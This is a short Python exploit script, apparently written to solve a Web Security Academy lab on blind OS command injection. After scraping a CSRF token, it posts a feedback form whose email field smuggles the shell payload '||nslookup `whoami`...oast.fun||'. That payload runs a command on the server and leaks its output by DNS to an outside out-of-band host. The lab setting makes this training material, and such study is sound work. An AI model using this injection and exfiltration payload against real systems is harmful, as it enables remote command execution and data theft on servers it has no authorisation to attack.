import requests
from bs4 import BeautifulSoup

url = "https://0a19002f04a8a78e801b4e7e00d60068.web-security-academy.net/"

if url.endswith("/"):
    url = url[:-1]

cookies = {
    "session" : "JVsAMO1sYjMcRyX0SifL2Cxw7Hr4puc5"
}

s = requests.Session()
def csrfTokenGet(endpoint):
    r = s.get(f"{url}{endpoint}", cookies=cookies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf
csrf = csrfTokenGet("/feedback")

def main():
    data = {
        "csrf" : csrf,
        "name" : "asd1",
        "email" : "admin@asds.com||nslookup `whoami`.vthdfgizsddhocpiqubyho9zcnk4esfr9.oast.fun||",
        "subject" : "asd",
        "message" : "asdasdsad"
    }

    r = requests.post(f"{url}/feedback/submit", data=data, cookies=cookies)
    return r
r = main()

print("Status Code is: ", r.status_code)
print(r.text)

# The rest part is taking the result of "whoami" command and writing to the popup page.